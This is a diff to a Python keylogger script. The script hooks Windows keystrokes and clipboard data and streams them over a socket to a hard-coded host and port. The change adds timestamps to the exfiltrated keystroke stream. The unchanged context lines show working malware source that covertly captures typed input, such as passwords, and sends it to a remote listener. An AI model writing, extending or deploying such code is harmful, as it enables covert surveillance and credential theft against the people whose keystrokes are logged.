@@ -3,6 +3,7 @@ from ctypes import *
 import socket, subprocess
 import pyHook, pythoncom, sys, logging
 import win32clipboard
+from time import gmtime, strftime
 
 HOST = '192.168.0.26'
 PORT = 5151
@@ -10,6 +11,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 s.send('[*] Connection Established!')
 s.send('\n[*] Listening for keystrokes <Press Return>')
+s.send('\n')
 
 while 1:
     data = s.recv(1024)
@@ -87,7 +89,7 @@ while 1:
 
             # new line when enter key is pressed for readability
             if event.Key == "Return":
-                s.send("\n")
+                s.send("\n[*] [" + strftime("%a, %d %b %Y %X", gmtime()) + "] ")
 
             # does not process the space command. Can remove later
             if event.Key == "Space":
